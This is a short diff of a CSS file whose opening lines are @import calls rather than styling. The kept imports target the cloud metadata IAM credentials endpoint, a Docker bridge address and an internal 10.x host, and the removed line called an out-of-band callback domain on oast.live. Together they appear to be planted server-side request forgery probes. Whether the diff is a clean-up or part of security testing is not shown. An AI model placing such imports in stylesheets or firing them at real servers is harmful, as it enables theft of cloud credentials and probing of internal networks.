@@ -2,7 +2,6 @@
 @import url("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
 @import url("http://172.17.0.1/");
 @import url("http://10.0.0.1/");
-@import url("http://d9n4dioj94oq9ebng1egdyb9rzm7jb6cz.oast.live");
 
 /* Style the page background */
 body {
